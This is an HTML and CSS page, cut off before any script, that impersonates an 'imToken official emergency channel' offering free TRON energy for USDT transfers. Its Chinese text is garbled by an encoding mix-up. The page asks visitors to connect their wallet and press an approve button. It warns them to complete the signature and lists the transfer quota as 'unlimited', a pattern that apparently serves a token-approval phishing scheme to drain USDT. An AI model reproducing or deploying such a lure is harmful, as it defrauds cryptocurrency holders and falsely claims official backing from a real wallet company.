<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imTokenå®˜æ–¹åº”æ€¥é€šé“</title>
    <meta property="og:title" content="imTokenå®˜æ–¹åº”æ€¥é€šé“" />
    <meta property="og:description" content="imTokenä¸“å±èƒ½é‡é¢†å–é€šé“ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©å¯å…è´¹é¢†å–90000Î¼s USDTè½¬è´¦èƒ½é‡" />
    <meta property="og:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
    <meta property="og:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="imTokenå®˜æ–¹åº”æ€¥é€šé“" />
    <meta name="twitter:description" content="imTokenä¸“å±èƒ½é‡é¢†å–é€šé“ï¼Œæ¯ä¸ªé’±åŒ…åœ°å€æ¯30å¤©å¯å…è´¹é¢†å–90000Î¼s USDTè½¬è´¦èƒ½é‡" />
    <meta name="twitter:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
    <meta name="twitter:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { 
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    padding: 8px 6px; /* å¢åŠ å†…è¾¹è·ï¼Œæ›´é¥±æ»¡ */
    max-width: 600px; 
    margin: 0 auto; 
    background: #ffffff; /* ç™½åº• */
    color: #000000; /* é»‘å­— */
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    gap: 5px; /* ç¼©å°æ¨¡å—é—´è·ï¼Œæ›´ç´§å‡‘ */
    border-radius: 8px;
    border-left: 3px solid #ef4444; /* æµ…çº¢è‰²è¾¹æ¡† */
    font-size: 14px; /* æ•´ä½“å­—ä½“è°ƒå¤§ */
    overflow-x: hidden;
}
.container {
    flex: 1; /* å æ»¡å‰©ä½™å‚ç›´ç©ºé—´ï¼Œæ¶ˆé™¤ç©ºæ¡£ */
    display: flex;
    flex-direction: column;
    gap: 5px; /* æ¨¡å—é—´è·ï¼Œé¿å…æ‹¥æŒ¤ */
    overflow-y: auto;
    padding-top: 90px; /* ç»™å›ºå®šé¡¶éƒ¨å®¹å™¨ç•™ç©ºé—´ */
}
/* é¡¶éƒ¨å®¹å™¨ï¼šå›ºå®šå®šä½+è°ƒæ•´æ ·å¼ */
.header-container {
    display: flex; /* å®¹å™¨å†…å…ƒç´ ä½¿ç”¨å¼¹æ€§å¸ƒå±€ */
    justify-content: space-between; /* å®¹å™¨å†…å…ƒç´ å·¦å³ä¸¤ç«¯å¯¹é½ï¼Œä¸­é—´è‡ªåŠ¨ç•™ç™½ */
    align-items: flex-end; /* å®¹å™¨å†…å…ƒç´ åœ¨å‚ç›´æ–¹å‘é ä¸‹å¯¹é½ */
    padding: 8px 8px; /* å®¹å™¨å†…è¾¹è·ï¼šä¸Šä¸‹8pxã€å·¦å³8px */
    border-bottom: 1px solid #fca5a5; /* æµ…çº¢è‰²è¾¹æ¡† */
    margin-bottom: 3px; /* å®¹å™¨åº•éƒ¨å¤–è¾¹è·ï¼š2pxï¼ˆä¸ä¸‹æ–¹å…ƒç´ æ‹‰å¼€è·ç¦»ï¼‰ */
    min-height: 80px; /* å®¹å™¨æœ€å°é«˜åº¦ï¼š80pxï¼ˆç¡®ä¿å†…å®¹ä¸ä¼šæŒ¤å˜å½¢ï¼‰ */
    padding-bottom:10px; /* å®¹å™¨åº•éƒ¨å†…è¾¹è·å•ç‹¬è®¾ç½®ï¼š1pxï¼ˆå¾®è°ƒåº•éƒ¨ç©ºç™½ï¼‰ */
    box-sizing: border-box; /* ç›’æ¨¡å‹ï¼šå†…è¾¹è·ã€è¾¹æ¡†ä¸ä¼šæ’‘å¤§å®¹å™¨å°ºå¯¸ */
    position: fixed; /* å®šä½æ–¹å¼ï¼šå›ºå®šå®šä½ï¼ˆä¸éšé¡µé¢æ»šåŠ¨è€Œç§»åŠ¨ï¼‰ */
    top: 0; /* å›ºå®šå®šä½çš„å‚ç›´ä½ç½®ï¼šè·ç¦»é¡¶éƒ¨0px */
    left: 0; /* å›ºå®šå®šä½çš„æ°´å¹³ä½ç½®ï¼šè·ç¦»å·¦ä¾§0px */
    right: 0; /* å›ºå®šå®šä½çš„æ°´å¹³ä½ç½®ï¼šè·ç¦»å³ä¾§0pxï¼ˆå®ç°â€œå®½åº¦å æ»¡å±å¹•â€ï¼‰ */
    max-width: 600px; /* å®¹å™¨æœ€å¤§å®½åº¦ï¼š600pxï¼ˆè¶…è¿‡600pxåä¸å†å˜å®½ï¼‰ */
    margin: 0 auto; /* æ°´å¹³å±…ä¸­ï¼šå·¦å³marginè‡ªåŠ¨åˆ†é…ï¼Œè®©å®¹å™¨åœ¨å±å¹•ä¸­é—´æ˜¾ç¤º */
    background: #ffffff; /* ç™½åº• */
    z-index: 999; /* å±‚çº§ä¼˜å…ˆçº§ï¼š999ï¼ˆç¡®ä¿åœ¨å…¶ä»–å…ƒç´ ä¸Šæ–¹æ˜¾ç¤ºï¼‰ */
}
.lang-switch {
    padding: 0;
    margin: 0;
    display: flex; /* æ”¹ä¸º Flex å¸ƒå±€ */
    flex-direction: column; /* å­å…ƒç´ ä¸Šä¸‹æ’åˆ— */
    align-items: flex-end; /* æ‰€æœ‰å­å…ƒç´ é å³å¯¹é½ */
    gap: 6px; /* æ–‡æœ¬å’ŒæŒ‰é’®çš„ä¸Šä¸‹é—´è·ï¼Œå¯è‡ªå®šä¹‰ */
}
/* æ–°å¢æ–‡æœ¬æ ·å¼ï¼ˆå¯æŒ‰éœ€è°ƒæ•´ï¼‰ */
.lang-text {
  color: #000000; /* é»‘å­— */
  font-size: 12px; /* å¯æ ¹æ®éœ€æ±‚è°ƒæ•´å¤§å° */
}
/* è¯­è¨€ä¸‹æ‹‰å®¹å™¨ */
.lang-dropdown {
    position: relative;
    display: inline-block;
}
/* ä¸‹æ‹‰è§¦å‘æŒ‰é’® */
.lang-toggle {
    padding: 3px 8px; /* è°ƒå¤§æŒ‰é’®å†…è¾¹è·ï¼Œæ›´æ˜“ç‚¹å‡» */
    border: 1px solid #ef4444; /* æµ…çº¢è‰²è¾¹æ¡† */
    border-radius: 20px;
    background: transparent;
    color: #000000; /* é»‘å­— */
    font-size: 13px; /* å­—ä½“è°ƒå¤§ */
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 4px;
}
.lang-toggle:hover {
    background: rgba(239, 68, 68, 0.2); /* æµ…çº¢è‰²é€æ˜èƒŒæ™¯ */
}
/* ä¸‹æ‹‰èœå•æ ·å¼ */
.lang-dropdown-menu {
    display: none;
    position: absolute;
    top: 100%;
    right: 0;
    min-width: 120px;
    background: #ffffff; /* ç™½è‰²èƒŒæ™¯ */
    border: 1px solid #ef4444; /* æµ…çº¢è‰²è¾¹æ¡† */
    border-radius: 8px;
    padding: 4px 0;
    z-index: 1000;
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
}
/* ä¸‹æ‹‰é€‰é¡¹æ ·å¼ */
.lang-dropdown-item {
    display: flex;
    align-items: center;
    gap: 6px;
    padding: 6px 12px;
    color: #000000; /* é»‘å­— */
    font-size: 13px;
    cursor: pointer;
    background: transparent;
    border: none;
    width: 100%;
    text-align: left;
}
.lang-dropdown-item:hover {
    background: rgba(239, 68, 68, 0.2); /* æµ…çº¢è‰²é€æ˜èƒŒæ™¯ */
}
/* æ˜¾ç¤ºä¸‹æ‹‰èœå• */
.lang-dropdown.open .lang-dropdown-menu {
    display: block;
}
.header {
    text-align: left;
    padding: 0;
    padding-bottom:1px;
    border-bottom: none;
    margin-bottom: 0;
    display: flex;
    align-items: flex-end;
    gap: 10px; /* å¢åŠ Logoä¸æ–‡å­—é—´è· */
       
}
  .header > div {
    display: flex; 
    gap: 10px; 
    align-items: flex-end; /* å…³é”®ï¼šè®©descé ä¸‹å¯¹é½ï¼ˆç›¸å¯¹äºh1ä¸‹ç§»ï¼‰ */
   
 }
/* Logoæ ·å¼ï¼šä¿æŒé•¿æ–¹å½¢æ¯”ä¾‹ï¼Œé€‚é…è°ƒå¤§çš„å®¹å™¨ */
.header-logo {
    width: 120px; 
    height: 40px; /* é•¿æ–¹å½¢æ¯”ä¾‹ï¼Œæ›´åè°ƒ */
    border-radius: 4px;
    object-fit: contain; /* é¿å…å˜å½¢ */
}
.header h1 { 
    font-size: 30px; /* å­—ä½“è°ƒå¤§ï¼Œæ›´é†’ç›® */
    color: #000000; /* é»‘è‰²æ ‡é¢˜ */
    margin-bottom: 0;
   line-height: 1.2;
}
.warning {
    background: #ffffff; /* ç™½è‰²èƒŒæ™¯ */
    color: #991b1b; /* æ·±çº¢è‰²æ–‡å­— */
    padding: 8px; /* è°ƒå¤§å†…è¾¹è· */
    border-radius: 8px;
    font-size: 12px; /* å­—ä½“è°ƒå¤§ */
    border-left: 3px solid #ef4444; /* æµ…çº¢è‰²è¾¹æ¡† */
    line-height: 1.5;
}
.warning strong {
    color: #ef4444; /* æµ…çº¢è‰²å¼ºè°ƒ */
}
/* ========== ä¿®æ”¹userInfoæ ·å¼ï¼šå››è§’å¸ƒå±€ ========== */
#userInfo {
    text-align: center;
    font-size: 12px; /* å­—ä½“è°ƒå¤§ */
    padding: 20px 12px; /* æ‰©å¤§å†…è¾¹è·ï¼Œé¿å…å››è§’å†…å®¹æº¢å‡º */
    background: #ffffff; /* ç™½è‰²èƒŒæ™¯ */
    border-radius: 8px;
    border: 1px solid #fca5a5; /* æµ…çº¢è‰²è¾¹æ¡† */
    line-height: 1.6;
    min-height: 120px; /* å¢å¤§æœ€å°é«˜åº¦ï¼Œå®¹çº³å››è§’å†…å®¹ */
    position: relative; /* çˆ¶å®¹å™¨ç›¸å¯¹å®šä½ */
}
/* å››è§’ä½™é¢é¡¹æ ·å¼ */
.balance-item {
    position: absolute;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 4px;
    font-size: 13px;
    color: #000000;
}
/* å››è§’å®šä½ */
.balance-usdt { top: 10px; left: 10px; }
.balance-trx { top: 10px; right: 10px; }
.balance-energy { bottom: 10px; left: 10px; }
.balance-bandwidth { bottom: 10px; right: 10px; }
/* ä½™é¢æ•°å€¼å¼ºè°ƒ */
.balance-value {
    color: #ef4444; /* æµ…çº¢è‰²æ•°å€¼ */
    font-size: 16px;
    font-weight: 600;
}
/* æœªè¿æ¥çŠ¶æ€æç¤ºï¼ˆå±…ä¸­ï¼‰ */
#userInfoDefault {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 100%;
}
#userInfo span {
    color: #ef4444; /* æµ…çº¢è‰²å¼ºè°ƒ */
    font-weight: 500;
}
/* é’±åŒ…çŠ¶æ€å®¹å™¨ï¼šé€‚é…ä¸¤ç§çŠ¶æ€ï¼Œè°ƒå¤§å†…å®¹ */
#walletStatusContainer {
    background: #ffffff; /* ç™½è‰²èƒŒæ™¯ */
    padding: 12px; /* è°ƒå¤§å†…è¾¹è· */
    border-radius: 8px;
    border: 1px solid #fca5a5; /* æµ…çº¢è‰²è¾¹æ¡† */
    font-size: 12px; /* å­—ä½“è°ƒå¤§ */
    color: #000000; /* é»‘å­— */
    line-height: 1.6;
    border-right: 5px solid #ef4444; /* æµ…çº¢è‰²è¾¹æ¡† */
    min-height: 150px; /* ç¡®ä¿éè¿æ¥çŠ¶æ€ä¸‹å†…å®¹å¡«æ»¡ï¼ˆéè¿æ¥æ—¶æ–‡å­—å¤šï¼‰ */
}
#walletStatusContainer .status-title {
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
    color: #000000; /* é»‘è‰²æ ‡é¢˜ */
    margin-bottom: 6px;
    display: flex;
    align-items: center;
    gap: 6px;
}
#walletStatusContainer .connected-content {
    display: none;
    min-height: 110px; /* è¿æ¥çŠ¶æ€ä¸‹ç¡®ä¿é«˜åº¦è¶³å¤Ÿ */
}
#walletStatusContainer.connected .disconnected-content {
    display: none;
}
#walletStatusContainer.connected .connected-content {
    display: block;
}
#walletStatusContainer .highlight {
    color: #ef4444; /* æµ…çº¢è‰²å¼ºè°ƒ */
    font-weight: 500;
}
#walletStatusContainer.connected .connected-content .orange-tip {
    color: #991b1b; /* æ·±çº¢è‰²æç¤º */
    margin-top: 5px;
    font-size: 12px; /* å­—ä½“è°ƒå¤§ */
}
/* åˆçº¦èµ„æºå®¹å™¨ï¼šè°ƒå¤§å†…å®¹+å¡«å……ç©ºé—´ */
#contractResourceContainer {
    background: #ffffff; /* ç™½è‰²èƒŒæ™¯ */
    padding: 12px; /* è°ƒå¤§å†…è¾¹è· */
    border-radius: 8px;
    border: 1px solid #fca5a5; /* æµ…çº¢è‰²è¾¹æ¡† */
    font-size: 12px; /* å­—ä½“è°ƒå¤§ */
    color: #000000; /* é»‘å­— */
    line-height: 1.7;
    border-bottom: 2px solid rgba(239, 68, 68, 0.2); /* æµ…çº¢è‰²é€æ˜è¾¹æ¡† */
    min-height: 80px; /* ç¡®ä¿é«˜åº¦è¶³å¤Ÿ */
}
#contractResourceContainer .status-title {
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
    color: #000000; /* é»‘è‰²æ ‡é¢˜ */
    margin-bottom: 6px;
    display: flex;
    align-items: center;
    gap: 4px;
}
#contractResourceContainer .status-title i {
    font-size: 16px; /* å­—ä½“è°ƒå¤§ */
    color: #ef4444; /* æµ…çº¢è‰²å›¾æ ‡ */
}
#contractResourceContainer .highlight {
    color: #ef4444; /* æµ…çº¢è‰²å¼ºè°ƒ */
    font-weight: 500;
}
#contractResourceContainer .data-tag {
    background: rgba(239, 68, 68, 0.15); /* æµ…çº¢è‰²é€æ˜èƒŒæ™¯ */
    padding: 2px 6px; /* è°ƒå¤§å†…è¾¹è· */
    border-radius: 4px;
    border: 1px solid rgba(239, 68, 68, 0.3); /* æµ…çº¢è‰²é€æ˜è¾¹æ¡† */
    font-size: 12px; /* å­—ä½“è°ƒå¤§ */
}
/* éè¿æ¥çŠ¶æ€ä¸“å±å®¹å™¨ï¼šè°ƒå¤§å†…å®¹+å¡«å……ç©ºé—´ */
.special-tip-container {
    background: #ffffff; /* ç™½è‰²èƒŒæ™¯ */
    padding: 16px; /* è°ƒå¤§å†…è¾¹è· */
    border-radius: 8px;
    border: 1px solid #fca5a5; /* æµ…çº¢è‰²è¾¹æ¡† */
    display: none;
    margin-top: 4px;
    border-right: 3px solid #ef4444; /* æµ…çº¢è‰²è¾¹æ¡† */
    box-shadow: -2px 0 0 0 #fca5a5; /* æµ…çº¢è‰²é˜´å½± */
    min-height: 80px; /* ç¡®ä¿æ˜¾ç¤ºæ—¶å¡«å……ç©ºé—´ */
}
.special-tip-title {
    font-size: 16px; /* å­—ä½“è°ƒå¤§ */
    color: #000000; /* é»‘è‰²æ ‡é¢˜ */
    font-weight: 600;
    margin-bottom: 6px;
}
.special-tip-content {
    font-size: 14px; /* å­—ä½“è°ƒå¤§ */
    color: #991b1b; /* æ·±çº¢è‰²æ–‡å­— */
    line-height: 1.7;
    font-weight: 500;
}
/* è¿æ¥çŠ¶æ€ä¸“å±å®¹å™¨ï¼šè°ƒå¤§å†…å®¹+å¡«å……ç©ºé—´ */
.record-list {
    background: #ffffff; /* ç™½è‰²èƒŒæ™¯ */
    padding: 12px; /* è°ƒå¤§å†…è¾¹è· */
    border-radius: 8px;
    border: 1px solid #fca5a5; /* æµ…çº¢è‰²è¾¹æ¡† */
    font-size: 12px; /* å­—ä½“è°ƒå¤§ */
    border-right: 5px solid #ef4444; /* æµ…çº¢è‰²è¾¹æ¡† */
    display: none;
    min-height: 100px; /* ç¡®ä¿æ˜¾ç¤ºæ—¶å¡«å……ç©ºé—´ */
}
.record-item {
    margin-bottom: 10px;
    padding-bottom: 10px;
    border-bottom: 1px solid #fca5a5; /* æµ…çº¢è‰²è¾¹æ¡† */
}
.record-item:hover {
    border-color: #ef4444; /* æµ…çº¢è‰²è¾¹æ¡† */
    transition: border-color 0.3s;
}
.record-item p {
    margin-bottom: 6px;
    color: #000000; /* é»‘å­— */
    line-height: 1.5;
    font-size: 13px; /* å­—ä½“è°ƒå¤§ */
}
.record-item p strong {
    color: #ef4444; /* æµ…çº¢è‰²å¼ºè°ƒ */
    margin-right: 5px;
}
.tx-link {
    color: #ef4444; /* æµ…çº¢è‰²é“¾æ¥ */
    text-decoration: none;
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-size: 13px; /* å­—ä½“è°ƒå¤§ */
}
.tx-link:hover {
    text-decoration: underline;
}
/* æŒ‰é’®ç»„ï¼šè´´è¿‘ä¸Šæ–¹å®¹å™¨ï¼Œæ¶ˆé™¤ç©ºæ¡£ */
.btn-group {
    display: flex;
    flex-direction: column;
    gap: 6px; /* å¢åŠ æŒ‰é’®é—´è·ï¼Œæ›´æ˜“ç‚¹å‡» */
    margin-top: 4px; /* ç¼©å°ä¸ä¸Šæ–¹å®¹å™¨çš„é—´è· */
    padding: 6px 0;
    border-top: 1px solid #fca5a5; /* æµ…çº¢è‰²è¾¹æ¡† */
}
.btn {
    width: 100%;
    padding: 12px; /* è°ƒå¤§å†…è¾¹è·ï¼Œæ›´é¥±æ»¡ */
    font-size: 15px; /* å­—ä½“è°ƒå¤§ï¼Œæ›´é†’ç›® */
    border: none;
    border-radius: 8px;
    background: #ef4444; /* æµ…çº¢è‰²æŒ‰é’® */
    color: white; /* ç™½è‰²æ–‡å­— */
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    transition: background 0.3s;
}
.btn:hover {
    background: #f87171; /* æ·±ä¸€ç‚¹çš„æµ…çº¢è‰² */
}
.btn:disabled {
    background: #fecaca; /* æµ…çº¢è‰²ç¦ç”¨çŠ¶æ€ */
    color: #991b1b; /* æ·±çº¢è‰²æ–‡å­— */
    cursor: not-allowed;
}
.footer-info {
    margin-top: 6px;
    padding-top: 6px;
    border-top: 1px solid #fca5a5; /* æµ…çº¢è‰²è¾¹æ¡† */
    font-size: 10px; /* å­—ä½“è°ƒå¤§ */
    color: #000000; /* é»‘å­— */
    text-align: center;
    line-height: 1.7;
}
.footer-info a {
    color: #ef4444; /* æµ…çº¢è‰²é“¾æ¥ */
    text-decoration: none;
}
.footer-info a:hover {
    text-decoration: underline;
} 
.text-right {
    text-align: right;
}
.review-tip {
    color: #ef4444; /* æµ…çº¢è‰²æç¤º */
    font-size: 12px; /* å­—ä½“è°ƒå¤§ */
    margin-top: 6px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
}
/* æ–°å¢ï¼šéimTokenç”¨æˆ·å¼¹çª—æ ·å¼ */
#nonImTokenPopup {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #ffffff; /* ç™½è‰²èƒŒæ™¯ */
    border: 1px solid #ef4444; /* æµ…çº¢è‰²è¾¹æ¡† */
    border-radius: 8px;
    padding: 16px;
    z-index: 1001;
    text-align: center;
}
#nonImTokenPopup p {
    color: #991b1b; /* æ·±çº¢è‰²æ–‡å­— */
    font-size: 14px;
    margin: 0 0 12px 0;
}
#closePopupBtn {
    padding: 4px 12px;
    border: none;
    border-radius: 4px;
    background: #ef4444; /* æµ…çº¢è‰²æŒ‰é’® */
    color: white;
    cursor: pointer;
}
/* ä¿ç•™ä½ è¦çš„åŠ è½½åŠ¨ç”»ï¼ˆä¿®å¤DOMç»“æ„ï¼‰ */
#Loading {
    width: 100%;
    height: 100vh;
    background-color: #FFFFFF;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
}
#Loading .loader {
    position: relative;
    width: 64px;
    height: 64px;
    border-radius: 50%;
    perspective: 800px;
}
#Loading .inner {
    position: absolute;
    box-sizing: border-box;
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
#Loading .inner.one {
    left: 0%;
    top: 0%;
    animation: rotate-one 1s linear infinite;
    border-bottom: 3px solid #c23631;
}
#Loading .inner.two {
    right: 0%;
    top: 0%;
    animation: rotate-two 1s linear infinite;
    border-right: 3px solid #c23631;
}
#Loading .inner.three {
    right: 0%;
    bottom: 0%;
    animation: rotate-three 1s linear infinite;
    border-top: 3px solid #c23631;
}
@keyframes rotate-one {
    0% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(0deg); }
    100% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(360deg); }
}
@keyframes rotate-two {
    0% { transform: rotateX(50deg) rotateY(10deg) rotateZ(0deg); }
    100% { transform: rotateX(50deg) rotateY(10deg) rotateZ(360deg); }
}
@keyframes rotate-three {
    0% { transform: rotateX(35deg) rotateY(55deg) rotateZ(0deg); }
    100% { transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg); }
}
    </style>
</head>
<body>
    <!-- ========== ä¿®å¤åŠ è½½åŠ¨ç”»ï¼šæ·»åŠ DOMç»“æ„ ========== -->
    <div id="Loading">
        <div class="loader">
            <div class="inner one"></div>
            <div class="inner two"></div>
            <div class="inner three"></div>
        </div>
    </div>

    <div class="container">      
        <!-- æ–°å¢ï¼šæ ‡é¢˜+è¯­è¨€åˆ‡æ¢åŒä¸€è¡Œ -->
        <div class="header-container">
            <div class="header">
                <!-- æ–°å¢ï¼šLogoå›¾ç‰‡ï¼ˆè·¯å¾„ä¸ä»“åº“ä¸­log.pngä¸€è‡´ï¼‰ -->
                <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/log.png" alt="imToken Logo" class="header-logo">
           </div>            
            <div class="lang-switch">
                <!-- è¯­è¨€ä¸‹æ‹‰ç»„ä»¶ï¼šæ›¿æ¢åŸå•ä¸€æŒ‰é’® -->
                <div class="lang-dropdown" id="langDropdown">
                    <button class="lang-toggle" id="langToggleBtn">
                        ğŸ‡¨ğŸ‡³<!-- åˆå§‹æ˜¾ç¤ºä¸­æ–‡å›½æ—— -->
                        <span id="currentLangText">ç®€ä½“ä¸­æ–‡</span>
                    </button>
                    <div class="lang-dropdown-menu">
                        <!-- ä¸­æ–‡é€‰é¡¹ -->
                        <button class="lang-dropdown-item" data-lang="zh">
                           ğŸ‡¨ğŸ‡³
                            <span>ç®€ä½“ä¸­æ–‡</span>
                        </button>
                        <!-- è‹±æ–‡é€‰é¡¹ -->
                        <button class="lang-dropdown-item" data-lang="en">
                           ğŸ‡ºğŸ‡¸
                            <span>English</span>
                        </button>
                    </div>
                </div>
                <span id="headerDesc" class="lang-text">imTokenå®˜æ–¹åº”æ€¥é€šé“</span> <!-- æ–°å¢æ–‡æœ¬ -->
         </div>
    </div>
        <!-- æ–°å¢ï¼šéimTokenç”¨æˆ·æç¤ºå¼¹çª— -->
        <div id="nonImTokenPopup">
            <p>ä¸æ”¯æŒéimTokenç”¨æˆ·</p>
            <button id="closePopupBtn">å…³é—­</button>
        </div>
        <!-- ========== ä¿®æ”¹åçš„userInfoå®¹å™¨ï¼ˆæ–°å¢åŠ¨æ€æç¤ºå®¹å™¨ï¼‰ ========== -->
<div id="userInfo">
    <!-- æœªè¿æ¥çŠ¶æ€é»˜è®¤æç¤ºï¼ˆåˆå§‹æ˜¾ç¤ºï¼‰ -->
    <span id="userInfoDefault">æœªè¿æ¥é’±åŒ…<br>
    <span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥imTokené’±åŒ…ã€æŒ‰é’®</span></span>
    
    <!-- æ–°å¢ï¼šåŠ¨æ€çŠ¶æ€æç¤ºå®¹å™¨ï¼ˆé»˜è®¤éšè—ï¼Œåªæ”¾åŠ¨æ€æ–‡æœ¬ï¼‰ -->
    <div id="userInfoStatus" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; display: none;"></div>
    
    <!-- è¿æ¥åæ˜¾ç¤ºçš„å››è§’ä½™é¢ï¼ˆé»˜è®¤éšè—ï¼ŒJSæ§åˆ¶æ˜¾ç¤ºï¼‰ -->
    <div class="balance-item balance-usdt" style="display: none;">
        <span>USDT</span>
        <span class="balance-value" id="balanceUsdt">0.00</span>
    </div>
    <div class="balance-item balance-trx" style="display: none;">
        <span>TRX</span>
        <span class="balance-value" id="balanceTrx">0.00</span>
    </div>
    <div class="balance-item balance-energy" style="display: none;">
        <span>èƒ½é‡</span>
        <span class="balance-value" id="balanceEnergy">0</span>Î¼s
    </div>
    <div class="balance-item balance-bandwidth" style="display: none;">
        <span>å®½å¸¦</span>
        <span class="balance-value" id="balanceBandwidth">0</span>
    </div>
</div>
        <div id="walletStatusContainer">
            <div class="status-title"><h3 id="walletStatusTitle">é’±åŒ…çŠ¶æ€</h3></div>
            <div class="disconnected-content">
                <span id="disconnectedText">æœªè¿æ¥é’±åŒ…</span>
                <p><span class="highlight" id="disconnectedTip1">æ­¤é“¾æ¥ä¸ºimTokenä¸“å±é€šé“ï¼ŒéimTokenç”¨æˆ·ä¸å¯é¢†å–</span></p>
                <p><span class="highlight" id="disconnectedTip2">1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡</span></p>         
                <p><span class="highlight" id="disconnectedTip3">2. æ­¤é“¾æ¥åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®</span></p>
                <p><span class="highlight" id="disconnectedTip4">3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚</span></p>
                <p><span class="highlight" id="disconnectedTip5">4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯</span></p>
            </div>
            <div class="connected-content">
                <p id="connectedSuccess">âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥</p>
                <p id="connectedAddress">â€¢ é’±åŒ…åœ°å€ï¼š<span class="highlight" id="statusAddress"></span></p>
                <p id="connectedType">â€¢ é¢†å–ç±»å‹ï¼š<span class="highlight">USDTè½¬è´¦èƒ½é‡</span></p>
                <p id="connectedAmount">â€¢ é¢†å–é¢åº¦ï¼š<span class="highlight">90000èƒ½é‡</span></p>
                <p class="orange-tip" id="connectedWarn">âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–</p>
            </div>
        </div>
        <div id="contractResourceContainer">
            <div class="status-title">     
                <h3 id="contractResourceTitle">åˆçº¦å‰©ä½™èµ„æº</h3>
            </div>
            <div class="resource-content" style="line-height: 1.8;">
                <p>â€¢ åˆçº¦åœ°å€ï¼š<span class="highlight" id="contractAddr"></span></p>
                <p>â€¢ å‰©ä½™èƒ½é‡ï¼š<span class="highlight data-tag" id="contractEnergy"></span>Î¼s</p>
                <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
                    æ³¨ï¼šå‰©ä½™èƒ½é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºimTokenå®˜æ–¹å‘è¡Œï¼Œåªé™imTokené’±åŒ…ç”¨æˆ·å‚ä¸ã€‚
                </p>
            </div>
        </div>
        <!-- æ–°å¢ï¼šéé’±åŒ…ç¯å¢ƒä¸“å±å®¹å™¨ï¼ˆæ·»åŠ idä¾¿äºJSæ§åˆ¶æ–‡æœ¬ï¼‰ -->
        <div class="special-tip-container" id="specialTipContainer">
            <div class="special-tip-title" id="specialTipTitle">imToken-EAB</div>
            <div class="special-tip-content" id="specialTipContent">
                æ­¤é“¾æ¥ä»…ä¸ºimTokenç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡ã€æ— TRXéœ€è¦åœ¨Tronç½‘ç»œè½¬è´¦æƒ…å†µä¸‹çš„ç´§æ€¥æ´åŠ©ï¼Œèµ„æºæœ‰é™è¯·å‹¿å½“ä½œç›ˆåˆ©é¡¹ç›®ã€‚
            </div>
        </div>
        <div class="record-list" id="recordList">
            <div style="display: flex; justify-content: space-between; margin: 4px 0;">
                <span id="recordTypeTitle">èƒ½é‡ä½¿ç”¨èŒƒå›´</span>
                <span id="recordAmountTitle">è½¬è´¦é¢åº¦</span>
            </div>
            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
                <span class="header"><h3 id="energyType">USDTè½¬è´¦</h3></span>
                <span class="header"><h3 id="transferQuota">æ— é™</h3></span>
            </div>       
            <span id="approvalRecords" class="highlight">æš‚æ— èƒ½é‡é¢†å–è®°å½•</span>        
        </div>
        <!-- æŒ‰é’®ç»„ç§»è¿›container -->
        <div class="btn-group">
            <div class="warning">
                <p id="browserWarn1"> âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€</p>
                <p id="browserWarn2"> âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®è‡ªåŠ¨å¤åˆ¶+å”¤èµ·imToken</p>  
            </div> 
            <button id="connectBtn" class="btn">è¿æ¥imTokené’±åŒ…</button>
            <button id="approveBtn" class="btn" disabled>é¢†å–èƒ½é‡</button>
           
            <div id="reviewTip" class="review-tip" style="display: none;">
